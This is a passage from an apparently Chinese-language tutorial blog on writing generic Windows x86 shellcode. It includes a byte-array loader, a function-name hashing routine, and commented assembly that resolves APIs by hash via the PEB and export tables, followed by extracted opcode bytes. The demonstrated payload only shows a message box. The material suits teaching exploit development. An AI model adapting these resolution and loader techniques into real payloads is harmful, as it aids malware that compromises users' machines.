number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token number">0x90</span> </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	_asm<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		lea eax<span class="token punctuation">,</span>shellcode</pre></td></tr><tr><td data-num="31"></td><td><pre>		push eax</pre></td></tr><tr><td data-num="32"></td><td><pre>		ret</pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>f9 断点，f10 调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410183352234.png" alt="image-20220410183352234" /></p>
<p>右键进入反汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410183441116.png" alt="image-20220410183441116" /></p>
<p>f10，进入 shellcode</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410183603805.png" alt="image-20220410183603805" /></p>
<p>如此即可在汇编部分进行调试</p>
<h2 id="函数名的哈希值计算"><a class="anchor" href="#函数名的哈希值计算">#</a> 函数名的哈希值计算</h2>
<ul>
<li>MessageBoxA -&gt; user32.dll</li>
<li>ExitProcess -&gt; kernel32.dll</li>
<li>LoadLibraryA -&gt; kernel32.dll</li>
<li>GetProcAddress -&gt; kernel32.dll</li>
</ul>
<p>测试源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>DWORD <span class="token function">GetHash</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> fun_name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	DWORD digest <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>fun_name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>		digest<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>digest<span class="token operator">&lt;&lt;</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>digest<span class="token operator">>></span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		digest<span class="token operator">+=</span><span class="token operator">*</span>fun_name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		fun_name<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">return</span> digest<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	DWORD hash<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	hash <span class="token operator">=</span> <span class="token function">GetHash</span><span class="token punctuation">(</span><span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hash is %.8x\n"</span><span class="token punctuation">,</span>hash<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410191650243.png" alt="image-20220410191650243" /></p>
<h2 id="动态函数地址通用shellcode编写"><a class="anchor" href="#动态函数地址通用shellcode编写">#</a> 动态函数地址通用 shellcode 编写</h2>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	_asm<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>		nop</pre></td></tr><tr><td data-num="5"></td><td><pre>		nop</pre></td></tr><tr><td data-num="6"></td><td><pre>		nop</pre></td></tr><tr><td data-num="7"></td><td><pre>		nop</pre></td></tr><tr><td data-num="8"></td><td><pre>		nop</pre></td></tr><tr><td data-num="9"></td><td><pre>		nop</pre></td></tr><tr><td data-num="10"></td><td><pre>		nop</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>		CLD</pre></td></tr><tr><td data-num="13"></td><td><pre>		push <span class="token number">0x1e380a6a</span><span class="token comment">//MessageBox</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		push <span class="token number">0x4fd18963</span><span class="token comment">//ExitProcess</span></pre></td></tr><tr><td data-num="15"></td><td><pre>		push <span class="token number">0x0c917432</span><span class="token comment">//LoadLibraryA </span></pre></td></tr><tr><td data-num="16"></td><td><pre>		mov esi<span class="token punctuation">,</span>esp<span class="token comment">//esp 赋值到 esi，指向第一个函数的哈希指针</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		lea edi<span class="token punctuation">,</span><span class="token punctuation">[</span>esi<span class="token operator">-</span><span class="token number">0xC</span><span class="token punctuation">]</span><span class="token comment">// 启动写入函数</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		</pre></td></tr><tr><td data-num="19"></td><td><pre>		xor ebx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="20"></td><td><pre>		mov bh<span class="token punctuation">,</span><span class="token number">0x04</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		sub esp<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token comment">// 避免直接立即数</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>		<span class="token comment">// 压入 user32</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		mov bx<span class="token punctuation">,</span><span class="token number">0x3233</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		push ebx</pre></td></tr><tr><td data-num="27"></td><td><pre>		push <span class="token number">0x72657375</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		push esp</pre></td></tr><tr><td data-num="29"></td><td><pre>		xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>		<span class="token comment">// 加载 kernel32</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		mov ebx<span class="token punctuation">,</span>fs<span class="token operator">:</span><span class="token punctuation">[</span>edx <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">]</span><span class="token comment">//teb</span></pre></td></tr><tr><td data-num="33"></td><td><pre>		mov ecx<span class="token punctuation">,</span><span class="token punctuation">[</span>ebx <span class="token operator">+</span> <span class="token number">0x0c</span><span class="token punctuation">]</span><span class="token comment">//teb 头指针</span></pre></td></tr><tr><td data-num="34"></td><td><pre>		mov ecx<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">]</span><span class="token comment">// 模块初始化列表的头指针</span></pre></td></tr><tr><td data-num="35"></td><td><pre>		mov ecx<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token punctuation">]</span><span class="token comment">// 后移，指向第二个节点</span></pre></td></tr><tr><td data-num="36"></td><td><pre>		mov ebp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">]</span><span class="token comment">// 偏移</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>find_lib_functions<span class="token operator">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>		lodsd</pre></td></tr><tr><td data-num="40"></td><td><pre>		cmp eax<span class="token punctuation">,</span><span class="token number">0x1e380a6a</span><span class="token comment">// 对比哈希值</span></pre></td></tr><tr><td data-num="41"></td><td><pre>		jne find_functions</pre></td></tr><tr><td data-num="42"></td><td><pre>		xchg eax<span class="token punctuation">,</span>ebp</pre></td></tr><tr><td data-num="43"></td><td><pre>		call <span class="token punctuation">[</span>edi <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		xchg eax<span class="token punctuation">,</span>ebp<span class="token comment">// 还原哈希值并更新 ebp</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>find_functions<span class="token operator">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>		pushad</pre></td></tr><tr><td data-num="48"></td><td><pre>		mov eax<span class="token punctuation">,</span><span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x3c</span><span class="token punctuation">]</span><span class="token comment">// 模块地址 + 0x3c = PE 头</span></pre></td></tr><tr><td data-num="49"></td><td><pre>		mov ecx<span class="token punctuation">,</span><span class="token punctuation">[</span>ebp <span class="token operator">+</span> eax <span class="token operator">+</span> <span class="token number">0x78</span><span class="token punctuation">]</span><span class="token comment">// 基址 + PE 头 + 0x78 = 导出表</span></pre></td></tr><tr><td data-num="50"></td><td><pre>		add ecx<span class="token punctuation">,</span>ebp<span class="token comment">// 获取导出表的绝对地址</span></pre></td></tr><tr><td data-num="51"></td><td><pre>		mov ebx<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token comment">// 获取名称表的相对偏移</span></pre></td></tr><tr><td data-num="52"></td><td><pre>		add ebx<span class="token punctuation">,</span>ebp<span class="token comment">// 获取名称表的绝对地址</span></pre></td></tr><tr><td data-num="53"></td><td><pre>		xor edi<span class="token punctuation">,</span>edi</pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre>next_function_loop<span class="token operator">:</span><span class="token comment">// 寻找函数</span></pre></td></tr><tr><td data-num="56"></td><td><pre>		inc edi<span class="token comment">// 循环计数器</span></pre></td></tr><tr><td data-num="57"></td><td><pre>		mov esi<span class="token punctuation">,</span><span class="token punctuation">[</span>ebx <span class="token operator">+</span> edi <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token comment">// 函数名的相对地址</span></pre></td></tr><tr><td data-num="58"></td><td><pre>		add esi<span class="token punctuation">,</span>ebp<span class="token comment">// 函数名的绝对地址</span></pre></td></tr><tr><td data-num="59"></td><td><pre>		cdq<span class="token comment">// 保存</span></pre></td></tr><tr><td data-num="60"></td><td><pre></pre></td></tr><tr><td data-num="61"></td><td><pre>hash_loop<span class="token operator">:</span><span class="token comment">// 哈希</span></pre></td></tr><tr><td data-num="62"></td><td><pre>		movsx eax<span class="token punctuation">,</span>byte ptr<span class="token punctuation">[</span>esi<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="63"></td><td><pre>		cmp al<span class="token punctuation">,</span>ah</pre></td></tr><tr><td data-num="64"></td><td><pre>		jz compare_hash</pre></td></tr><tr><td data-num="65"></td><td><pre>		ror edx<span class="token punctuation">,</span><span class="token number">7</span></pre></td></tr><tr><td data-num="66"></td><td><pre>		add edx<span class="token punctuation">,</span>eax</pre></td></tr><tr><td data-num="67"></td><td><pre>		inc esi</pre></td></tr><tr><td data-num="68"></td><td><pre>		jmp hash_loop<span class="token comment">// 自循环</span></pre></td></tr><tr><td data-num="69"></td><td><pre></pre></td></tr><tr><td data-num="70"></td><td><pre>compare_hash<span class="token operator">:</span><span class="token comment">// 对比哈希</span></pre></td></tr><tr><td data-num="71"></td><td><pre>		cmp edx<span class="token punctuation">,</span><span class="token punctuation">[</span>esp <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">]</span><span class="token comment">// 对比</span></pre></td></tr><tr><td data-num="72"></td><td><pre>		jnz next_function_loop<span class="token comment">// 失败跳转</span></pre></td></tr><tr><td data-num="73"></td><td><pre>		mov ebx<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">]</span><span class="token comment">// 获取相对偏移，指向序号表</span></pre></td></tr><tr><td data-num="74"></td><td><pre>		add ebx<span class="token punctuation">,</span>ebp<span class="token comment">// 序号表的绝对偏移</span></pre></td></tr><tr><td data-num="75"></td><td><pre>		mov di<span class="token punctuation">,</span><span class="token punctuation">[</span>ebx <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> edi<span class="token punctuation">]</span><span class="token comment">// 保存序号</span></pre></td></tr><tr><td data-num="76"></td><td><pre>		mov ebx<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">]</span><span class="token comment">// 获取地址表的相对偏移</span></pre></td></tr><tr><td data-num="77"></td><td><pre>		add ebx<span class="token punctuation">,</span>ebp<span class="token comment">//// 获取地址表的绝对偏移</span></pre></td></tr><tr><td data-num="78"></td><td><pre>		add ebp<span class="token punctuation">,</span><span class="token punctuation">[</span>ebx <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> edi<span class="token punctuation">]</span><span class="token comment">// 计算 base 地址，模块的相对偏移</span></pre></td></tr><tr><td data-num="79"></td><td><pre>		xchg eax<span class="token punctuation">,</span>ebp<span class="token comment">// 移动函数地址</span></pre></td></tr><tr><td data-num="80"></td><td><pre>		pop edi</pre></td></tr><tr><td data-num="81"></td><td><pre>		stosd</pre></td></tr><tr><td data-num="82"></td><td><pre>		push edi</pre></td></tr><tr><td data-num="83"></td><td><pre>		popad</pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre>		cmp eax<span class="token punctuation">,</span><span class="token number">0x1e380a6a</span><span class="token comment">// 对比哈希值</span></pre></td></tr><tr><td data-num="86"></td><td><pre>		jne find_lib_functions<span class="token comment">// 失败跳转</span></pre></td></tr><tr><td data-num="87"></td><td><pre></pre></td></tr><tr><td data-num="88"></td><td><pre>function_call<span class="token operator">:</span><span class="token comment">// 弹窗</span></pre></td></tr><tr><td data-num="89"></td><td><pre>		xor ebx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="90"></td><td><pre>		push ebx</pre></td></tr><tr><td data-num="91"></td><td><pre>		push <span class="token number">0x66666666</span></pre></td></tr><tr><td data-num="92"></td><td><pre>		push <span class="token number">0x66666666</span></pre></td></tr><tr><td data-num="93"></td><td><pre>		mov eax<span class="token punctuation">,</span>esp</pre></td></tr><tr><td data-num="94"></td><td><pre>		push ebx</pre></td></tr><tr><td data-num="95"></td><td><pre>		push eax</pre></td></tr><tr><td data-num="96"></td><td><pre>		push eax</pre></td></tr><tr><td data-num="97"></td><td><pre>		push ebx</pre></td></tr><tr><td data-num="98"></td><td><pre>		call <span class="token punctuation">[</span>edi <span class="token operator">-</span> <span class="token number">0x04</span><span class="token punctuation">]</span><span class="token comment">//MessageBox 函数</span></pre></td></tr><tr><td data-num="99"></td><td><pre>		push ebx</pre></td></tr><tr><td data-num="100"></td><td><pre>		call <span class="token punctuation">[</span>edi <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">]</span><span class="token comment">//ExitProcess 函数</span></pre></td></tr><tr><td data-num="101"></td><td><pre>		nop</pre></td></tr><tr><td data-num="102"></td><td><pre>		nop</pre></td></tr><tr><td data-num="103"></td><td><pre>		nop</pre></td></tr><tr><td data-num="104"></td><td><pre>		nop</pre></td></tr><tr><td data-num="105"></td><td><pre>		nop</pre></td></tr><tr><td data-num="106"></td><td><pre>		nop</pre></td></tr><tr><td data-num="107"></td><td><pre>		nop</pre></td></tr><tr><td data-num="108"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="109"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410192112679.png" alt="image-20220410192112679" /></p>
<p>OD 分析</p>
<p>找到入口点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410195912959.png" alt="image-20220410195912959" /></p>
<p>即可找到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410195953261.png" alt="image-20220410195953261" /></p>
<p>二进制复制</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>FC <span class="token number">68</span> <span class="token number">6</span>A <span class="token number">0</span>A <span class="token number">38</span> <span class="token number">1</span>E <span class="token number">68</span> <span class="token number">63</span> <span class="token number">89</span> D1 <span class="token number">4F</span> <span class="token number">68</span> <span class="token number">32</span> <span class="token number">74</span> <span class="token number">91</span> <span class="token number">0</span>C <span class="token number">8</span>B F4 <span class="token number">8</span>D <span class="token number">7</span>E F4 <span class="token number">33</span> DB B7 <span class="token number">04</span> <span class="token number">2</span>B E3 <span class="token number">66</span> BB <span class="token number">33</span> <span class="token number">32</span> <span class="token number">53</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">68</span> <span class="token number">75</span> <span class="token number">73</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">54</span> <span class="token number">33</span> D2 <span class="token number">64</span> <span class="token number">8</span>B <span class="token number">5</span>A <span class="token number">30</span> <span class="token number">8</span>B <span class="token number">4</span>B <span class="token number">0</span>C <span class="token number">8</span>B <span class="token number">49</span> <span class="token number">1</span>C <span class="token number">8</span>B <span class="token number">09</span> <span class="token number">8</span>B <span class="token number">69</span> <span class="token number">08</span> AD <span class="token number">3</span>D <span class="token number">6</span>A <span class="token number">0</span>A <span class="token number">38</span> <span class="token number">1</span>E <span class="token number">75</span> <span class="token number">05</span> <span class="token number">95</span></pre></td></tr><tr><td data-num="3"></td><td><pre>FF <span class="token number">57</span> F8 <span class="token number">95</span> <span class="token number">60</span> <span class="token number">8</span>B <span class="token number">45</span> <span class="token number">3</span>C <span class="token number">8</span>B <span class="token number">4</span>C <span class="token number">05</span> <span class="token number">78</span> <span class="token number">03</span> CD <span class="token number">8</span>B <span class="token number">59</span> <span class="token number">20</span> <span class="token number">03</span> DD <span class="token number">33</span> FF <span class="token number">47</span> <span class="token number">8</span>B <span class="token number">34</span> BB <span class="token number">03</span> F5 <span class="token number">99</span> <span class="token number">0F</span> BE <span class="token number">06</span> <span class="token number">3</span>A</pre></td></tr><tr><td data-num="4"></td><td><pre>C4 <span class="token number">74</span> <span class="token number">08</span> C1 CA <span class="token number">07</span> <span class="token number">03</span> D0 <span class="token number">46</span> EB F1 <span class="token number">3</span>B <span class="token number">54</span> <span class="token number">24</span> <span class="token number">1</span>C <span class="token number">75</span> E4 <span class="token number">8</span>B <span class="token number">59</span> <span class="token number">24</span> <span class="token number">03</span> DD <span class="token number">66</span> <span class="token number">8</span>B <span class="token number">3</span>C <span class="token number">7</span>B <span class="token number">8</span>B <span class="token number">59</span> <span class="token number">1</span>C <span class="token number">03</span> DD <span class="token number">03</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">2</span>C BB <span class="token number">95</span> <span class="token number">5F</span> AB <span class="token number">57</span> <span class="token number">61</span> <span class="token number">3</span>D <span class="token number">6</span>A <span class="token number">0</span>A <span class="token number">38</span> <span class="token number">1</span>E <span class="token number">75</span> A9 <span class="token number">33</span> DB <span class="token number">53</span> <span class="token number">68</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">68</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">8</span>B C4 <span class="token number">53</span> <span class="token number">50</span> <span class="token number">50</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">53</span> FF <span class="token number">57</span> FC <span class="token number">53</span> FF <span class="token number">57</span> F8 <span class="token 